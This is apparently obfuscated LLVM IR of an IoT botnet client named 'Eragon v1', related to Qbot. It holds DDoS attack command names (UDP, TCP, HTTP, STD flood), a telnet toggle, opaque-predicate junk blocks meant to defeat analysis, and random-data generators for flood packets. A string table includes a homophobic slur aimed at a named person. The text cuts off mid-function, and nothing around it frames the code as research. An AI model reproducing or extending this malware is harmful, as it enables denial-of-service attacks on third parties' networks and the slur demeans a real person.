@.str.129 = private unnamed_addr constant [11 x i8] c"0nnf0l20im\00", align 1
@.str.130 = private unnamed_addr constant [11 x i8] c"uq7ajzgm0a\00", align 1
@.str.131 = private unnamed_addr constant [5 x i8] c"loic\00", align 1
@.str.132 = private unnamed_addr constant [19 x i8] c"ParasJhaIsADumbFag\00", align 1
@.str.133 = private unnamed_addr constant [17 x i8] c"stdudpbasedflood\00", align 1
@.str.134 = private unnamed_addr constant [9 x i8] c"bitcoin1\00", align 1
@.str.135 = private unnamed_addr constant [9 x i8] c"password\00", align 1
@.str.136 = private unnamed_addr constant [10 x i8] c"encrypted\00", align 1
@.str.137 = private unnamed_addr constant [12 x i8] c"suckmyFOUND\00", align 1
@.str.138 = private unnamed_addr constant [13 x i8] c"guardiacivil\00", align 1
@.str.139 = private unnamed_addr constant [13 x i8] c"2xoJTsbXunuj\00", align 1
@.str.140 = private unnamed_addr constant [13 x i8] c"QiMH8CGJyOj9\00", align 1
@.str.141 = private unnamed_addr constant [9 x i8] c"abcd1234\00", align 1
@.str.142 = private unnamed_addr constant [13 x i8] c"GLEQWXHAJPWM\00", align 1
@.str.143 = private unnamed_addr constant [10 x i8] c"ABCDEFGHI\00", align 1
@.str.144 = private unnamed_addr constant [10 x i8] c"abcdefghi\00", align 1
@.str.145 = private unnamed_addr constant [11 x i8] c"qbotbotnet\00", align 1
@.str.146 = private unnamed_addr constant [12 x i8] c"lizardsquad\00", align 1
@.str.147 = private unnamed_addr constant [10 x i8] c"aNrjBnTRi\00", align 1
@.str.148 = private unnamed_addr constant [10 x i8] c"1QD8ypG86\00", align 1
@.str.149 = private unnamed_addr constant [10 x i8] c"IVkLWYjLe\00", align 1
@.str.150 = private unnamed_addr constant [12 x i8] c"kadenthegod\00", align 1
@.str.151 = private unnamed_addr constant [15 x i8] c"satoriskidsnet\00", align 1
@sendSTD.randstrings = private unnamed_addr constant [36 x i8*] [i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.151, i32 0, i32 0)], align 16
@.str.152 = private unnamed_addr constant [7 x i8] c"TELNET\00", align 1
@.str.153 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@botnetPid = common global i32 0, align 4
@.str.154 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.155 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.156 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.157 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.158 = private unnamed_addr constant [8 x i8] c"HTTPHEX\00", align 1
@.str.159 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.160 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.161 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.162 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.163 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.164 = private unnamed_addr constant [11 x i8] c"BIG_ENDIAN\00", align 1
@.str.165 = private unnamed_addr constant [14 x i8] c"LITTLE_ENDIAN\00", align 1
@.str.166 = private unnamed_addr constant [13 x i8] c"BIG_ENDIAN_W\00", align 1
@.str.167 = private unnamed_addr constant [16 x i8] c"LITTLE_ENDIAN_W\00", align 1
@.str.168 = private unnamed_addr constant [8 x i8] c"UNKNOWN\00", align 1
@.str.169 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.170 = private unnamed_addr constant [37 x i8] c"\1B[96m[%s] \1B[97mConnected -> %s -> %s\00", align 1
@.str.171 = private unnamed_addr constant [10 x i8] c"Eragon v1\00", align 1
@.str.172 = private unnamed_addr constant [2 x i8] c" \00", align 1
@ourPublicIP = common global %struct.in_addr zeroinitializer, align 4
@.str.173 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0
@x.57 = common global i32 0
@y.58 = common global i32 0
@x.59 = common global i32 0
@y.60 = common global i32 0
@x.61 = common global i32 0
@y.62 = common global i32 0
@x.63 = common global i32 0
@y.64 = common global i32 0
@x.65 = common global i32 0
@y.66 = common global i32 0
@x.67 = common global i32 0
@y.68 = common global i32 0
@x.69 = common global i32 0
@y.70 = common global i32 0
@x.71 = common global i32 0
@y.72 = common global i32 0
@x.73 = common global i32 0
@y.74 = common global i32 0
@x.75 = common global i32 0
@y.76 = common global i32 0
@x.77 = common global i32 0
@y.78 = common global i32 0
@x.79 = common global i32 0
@y.80 = common global i32 0
@x.81 = common global i32 0
@y.82 = common global i32 0
@x.83 = common global i32 0
@y.84 = common global i32 0
@x.85 = common global i32 0
@y.86 = common global i32 0
@x.87 = common global i32 0
@y.88 = common global i32 0
@x.89 = common global i32 0
@y.90 = common global i32 0
@x.91 = common global i32 0
@y.92 = common global i32 0
@x.93 = common global i32 0
@y.94 = common global i32 0
@x.95 = common global i32 0
@y.96 = common global i32 0
@x.97 = common global i32 0
@y.98 = common global i32 0
@x.99 = common global i32 0
@y.100 = common global i32 0
@x.101 = common global i32 0
@y.102 = common global i32 0
@x.103 = common global i32 0
@y.104 = common global i32 0
@x.105 = common global i32 0
@y.106 = common global i32 0
@x.107 = common global i32 0
@y.108 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i8* @getBuildz() #0 {
  %1 = alloca i8*, align 8
  %2 = call i32 @access(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i32 0, i32 0), i32 0) #3
  %3 = icmp ne i32 %2, -1
  br i1 %3, label %4, label %5

; <label>:4:                                      ; preds = %0
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0), i8** %1, align 8
  br label %6

; <label>:5:                                      ; preds = %0
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8** %1, align 8
  br label %6

; <label>:6:                                      ; preds = %5, %4
  %7 = load i32, i32* @x.3
  %8 = load i32, i32* @y.4
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = load i8*, i8** %1, align 8
  %16 = load i32, i32* @x.3
  %17 = load i32, i32* @y.4
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i8* %15

originalBBalteredBB:                              ; preds = %originalBB, %6
  %24 = load i8*, i8** %1, align 8
  br label %originalBB
}

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

; <label>:10:                                     ; preds = %31, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %34

; <label>:13:                                     ; preds = %10
  %14 = load i32, i32* %3, align 4
  %15 = sub nsw i32 %14, 3
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = load i32, i32* %3, align 4
  %20 = sub nsw i32 %19, 2
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = xor i32 %18, %23
  %25 = xor i32 %24, -1640531527
  %26 = load i32, i32* %3, align 4
  %27 = xor i32 %25, %26
  %28 = load i32, i32* %3, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  store i32 %27, i32* %30, align 4
  br label %31

; <label>:31:                                     ; preds = %13
  %32 = load i32, i32* %3, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %3, align 4
  br label %10

; <label>:34:                                     ; preds = %10
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = load i32, i32* @x.7
  %2 = load i32, i32* @y.8
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i64 18782, i64* %10, align 8
  store i32 -2, i32* %12, align 4
  %13 = load i32, i32* @rand_cmwc.i, align 4
  %14 = add i32 %13, 1
  %15 = and i32 %14, 4095
  store i32 %15, i32* @rand_cmwc.i, align 4
  %16 = load i64, i64* %10, align 8
  %17 = load i32, i32* @rand_cmwc.i, align 4
  %18 = zext i32 %17 to i64
  %19 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %18
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = mul i64 %16, %21
  %23 = load i32, i32* @c, align 4
  %24 = zext i32 %23 to i64
  %25 = add i64 %22, %24
  store i64 %25, i64* %9, align 8
  %26 = load i64, i64* %9, align 8
  %27 = lshr i64 %26, 32
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* @c, align 4
  %29 = load i64, i64* %9, align 8
  %30 = load i32, i32* @c, align 4
  %31 = zext i32 %30 to i64
  %32 = add i64 %29, %31
  %33 = trunc i64 %32 to i32
  store i32 %33, i32* %11, align 4
  %34 = load i32, i32* %11, align 4
  %35 = load i32, i32* @c, align 4
  %36 = icmp ult i32 %34, %35
  %37 = load i32, i32* @x.7
  %38 = load i32, i32* @y.8
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %36, label %45, label %66

; <label>:45:                                     ; preds = %originalBBpart2
  %46 = load i32, i32* @x.7
  %47 = load i32, i32* @y.8
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %45
  %54 = load i32, i32* %11, align 4
  %55 = add i32 %54, 1
  store i32 %55, i32* %11, align 4
  %56 = load i32, i32* @c, align 4
  %57 = add i32 %56, 1
  store i32 %57, i32* @c, align 4
  %58 = load i32, i32* @x.7
  %59 = load i32, i32* @y.8
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart266, label %originalBB54alteredBB

originalBBpart266:                                ; preds = %originalBB54
  br label %66

; <label>:66:                                     ; preds = %originalBBpart266, %originalBBpart2
  %67 = load i32, i32* %12, align 4
  %68 = load i32, i32* %11, align 4
  %69 = sub i32 %67, %68
  %70 = load i32, i32* @rand_cmwc.i, align 4
  %71 = zext i32 %70 to i64
  %72 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %71
  store i32 %69, i32* %72, align 4
  ret i32 %69

originalBBalteredBB:                              ; preds = %originalBB, %0
  %73 = alloca i64, align 8
  %74 = alloca i64, align 8
  %75 = alloca i32, align 4
  %76 = alloca i32, align 4
  store i64 18782, i64* %74, align 8
  store i32 -2, i32* %76, align 4
  %77 = load i32, i32* @rand_cmwc.i, align 4
  %_ = sub i32 0, %77
  %gen = add i32 %_, 1
  %_1 = sub i32 0, %77
  %gen2 = add i32 %_1, 1
  %_3 = sub i32 %77, 1
  %gen4 = mul i32 %_3, 1
  %_5 = sub i32 0, %77
  %gen6 = add i32 %_5, 1
  %_7 = shl i32 %77, 1
  %_8 = sub i32 0, %77
  %gen9 = add i32 %_8, 1
  %_10 = sub i32 0, %77
  %gen11 = add i32 %_10, 1
  %78 = add i32 %77, 1
  %_12 = sub i32 %78, 4095
  %gen13 = mul i32 %_12, 4095
  %_14 = sub i32 0, %78
  %gen15 = add i32 %_14, 4095
  %79 = and i32 %78, 4095
  store i32 %79, i32* @rand_cmwc.i, align 4
  %80 = load i64, i64* %74, align 8
  %81 = load i32, i32* @rand_cmwc.i, align 4
  %82 = zext i32 %81 to i64
  %83 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %82
  %84 = load i32, i32* %83, align 4
  %85 = zext i32 %84 to i64
  %_16 = sub i64 %80, %85
  %gen17 = mul i64 %_16, %85
  %_18 = sub i64 0, %80
  %gen19 = add i64 %_18, %85
  %_20 = sub i64 %80, %85
  %gen21 = mul i64 %_20, %85
  %_22 = sub i64 0, %80
  %gen23 = add i64 %_22, %85
  %_24 = sub i64 0, %80
  %gen25 = add i64 %_24, %85
  %86 = mul i64 %80, %85
  %87 = load i32, i32* @c, align 4
  %88 = zext i32 %87 to i64
  %_26 = sub i64 %86, %88
  %gen27 = mul i64 %_26, %88
  %_28 = shl i64 %86, %88
  %89 = add i64 %86, %88
  store i64 %89, i64* %73, align 8
  %90 = load i64, i64* %73, align 8
  %_29 = shl i64 %90, 32
  %_30 = sub i64 0, %90
  %gen31 = add i64 %_30, 32
  %_32 = sub i64 %90, 32
  %gen33 = mul i64 %_32, 32
  %_34 = sub i64 %90, 32
  %gen35 = mul i64 %_34, 32
  %_36 = sub i64 0, %90
  %gen37 = add i64 %_36, 32
  %_38 = sub i64 %90, 32
  %gen39 = mul i64 %_38, 32
  %_40 = sub i64 %90, 32
  %gen41 = mul i64 %_40, 32
  %_42 = sub i64 0, %90
  %gen43 = add i64 %_42, 32
  %91 = lshr i64 %90, 32
  %92 = trunc i64 %91 to i32
  store i32 %92, i32* @c, align 4
  %93 = load i64, i64* %73, align 8
  %94 = load i32, i32* @c, align 4
  %95 = zext i32 %94 to i64
  %_44 = sub i64 %93, %95
  %gen45 = mul i64 %_44, %95
  %_46 = sub i64 %93, %95
  %gen47 = mul i64 %_46, %95
  %_48 = sub i64 0, %93
  %gen49 = add i64 %_48, %95
  %_50 = sub i64 %93, %95
  %gen51 = mul i64 %_50, %95
  %_52 = sub i64 %93, %95
  %gen53 = mul i64 %_52, %95
  %96 = add i64 %93, %95
  %97 = trunc i64 %96 to i32
  store i32 %97, i32* %75, align 4
  %98 = load i32, i32* %75, align 4
  %99 = load i32, i32* @c, align 4
  %100 = icmp ult i32 %98, %99
  br label %originalBB

originalBB54alteredBB:                            ; preds = %originalBB54, %45
  %101 = load i32, i32* %11, align 4
  %_55 = sub i32 %101, 1
  %gen56 = mul i32 %_55, 1
  %_57 = sub i32 %101, 1
  %gen58 = mul i32 %_57, 1
  %102 = add i32 %101, 1
  store i32 %102, i32* %11, align 4
  %103 = load i32, i32* @c, align 4
  %_59 = sub i32 %103, 1
  %gen60 = mul i32 %_59, 1
  %_61 = shl i32 %103, 1
  %_62 = sub i32 0, %103
  %gen63 = add i32 %_62, 1
  %_64 = shl i32 %103, 1
  %104 = add i32 %103, 1
  store i32 %104, i32* @c, align 4
  br label %originalBB54
}

; Function Attrs: noinline nounwind uwtable
define void @rand_init() #0 {
  %1 = call i64 @time(i64* null) #3
  %2 = trunc i64 %1 to i32
  store i32 %2, i32* @x, align 4
  %3 = call i32 @getpid() #3
  %4 = call i32 @getppid() #3
  %5 = xor i32 %3, %4
  store i32 %5, i32* @y, align 4
  %6 = call i64 @clock() #3
  %7 = trunc i64 %6 to i32
  store i32 %7, i32* @z, align 4
  %8 = load i32, i32* @z, align 4
  %9 = load i32, i32* @y, align 4
  %10 = xor i32 %8, %9
  store i32 %10, i32* @w, align 4
  ret void
}

; Function Attrs: nounwind
declare i64 @time(i64*) #1

; Function Attrs: nounwind
declare i32 @getpid() #1

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: nounwind
declare i64 @clock() #1

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind uwtable
define void @rand_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  br label %5

; <label>:5:                                      ; preds = %109, %2
  %6 = load i32, i32* %4, align 4
  %7 = icmp sgt i32 %6, 0
  br i1 %7, label %8, label %110

; <label>:8:                                      ; preds = %5
  %9 = load i32, i32* %4, align 4
  %10 = icmp sge i32 %9, 4
  br i1 %10, label %11, label %37

; <label>:11:                                     ; preds = %8
  %12 = load i32, i32* @x.13
  %13 = load i32, i32* @y.14
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %11
  %20 = call i32 @rand_next()
  %21 = load i8*, i8** %3, align 8
  %22 = bitcast i8* %21 to i32*
  store i32 %20, i32* %22, align 4
  %23 = load i8*, i8** %3, align 8
  %24 = getelementptr inbounds i8, i8* %23, i64 4
  store i8* %24, i8** %3, align 8
  %25 = load i32, i32* %4, align 4
  %26 = sext i32 %25 to i64
  %27 = sub i64 %26, 4
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %4, align 4
  %29 = load i32, i32* @x.13
  %30 = load i32, i32* @y.14
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %109

; <label>:37:                                     ; preds = %8
  %38 = load i32, i32* %4, align 4
  %39 = icmp sge i32 %38, 2
  br i1 %39, label %40, label %68

; <label>:40:                                     ; preds = %37
  %41 = load i32, i32* @x.13
  %42 = load i32, i32* @y.14
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %40
  %49 = call i32 @rand_next()
  %50 = and i32 %49, 65535
  %51 = trunc i32 %50 to i16
  %52 = load i8*, i8** %3, align 8
  %53 = bitcast i8* %52 to i16*
  store i16 %51, i16* %53, align 2
  %54 = load i8*, i8** %3, align 8
  %55 = getelementptr inbounds i8, i8* %54, i64 2
  store i8* %55, i8** %3, align 8
  %56 = load i32, i32* %4, align 4
  %57 = sext i32 %56 to i64
  %58 = sub i64 %57, 2
  %59 = trunc i64 %58 to i32
  store i32 %59, i32* %4, align 4
  %60 = load i32, i32* @x.13
  %61 = load i32, i32* @y.14
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBBpart227, label %originalBB14alteredBB

originalBBpart227:                                ; preds = %originalBB14
  br label %92

; <label>:68:                                     ; preds = %37
  %69 = load i32, i32* @x.13
  %70 = load i32, i32* @y.14
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %68
  %77 = call i32 @rand_next()
  %78 = and i32 %77, 255
  %79 = trunc i32 %78 to i8
  %80 = load i8*, i8** %3, align 8
  %81 = getelementptr inbounds i8, i8* %80, i32 1
  store i8* %81, i8** %3, align 8
  store i8 %79, i8* %80, align 1
  %82 = load i32, i32* %4, align 4
  %83 = add nsw i32 %82, -1
  store i32 %83, i32* %4, align 4
  %84 = load i32, i32* @x.13
  %85 = load i32, i32* @y.14
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBBpart246, label %originalBB29alteredBB

originalBBpart246:                                ; preds = %originalBB29
  br label %92

; <label>:92:                                     ; preds = %originalBBpart246, %originalBBpart227
  %93 = load i32, i32* @x.13
  %94 = load i32, i32* @y.14
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %92
  %101 = load i32, i32* @x.13
  %102 = load i32, i32* @y.14
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br label %109

; <label>:109:                                    ; preds = %originalBBpart250, %originalBBpart2
  br label %5

; <label>:110:                                    ; preds = %5
  %111 = load i32, i32* @x.13
  %112 = load i32, i32* @y.14
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %110
  %119 = load i32, i32* @x.13
  %120 = load i32, i32* @y.14
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %11
  %127 = call i32 @rand_next()
  %128 = load i8*, i8** %3, align 8
  %129 = bitcast i8* %128 to i32*
  store i32 %127, i32* %129, align 4
  %130 = load i8*, i8** %3, align 8
  %131 = getelementptr inbounds i8, i8* %130, i64 4
  store i8* %131, i8** %3, align 8
  %132 = load i32, i32* %4, align 4
  %133 = sext i32 %132 to i64
  %_ = sub i64 0, %133
  %gen = add i64 %_, 4
  %_1 = shl i64 %133, 4
  %_2 = sub i64 0, %133
  %gen3 = add i64 %_2, 4
  %_4 = shl i64 %133, 4
  %_5 = shl i64 %133, 4
  %_6 = shl i64 %133, 4
  %_7 = sub i64 %133, 4
  %gen8 = mul i64 %_7, 4
  %_9 = shl i64 %133, 4
  %_10 = sub i64 %133, 4
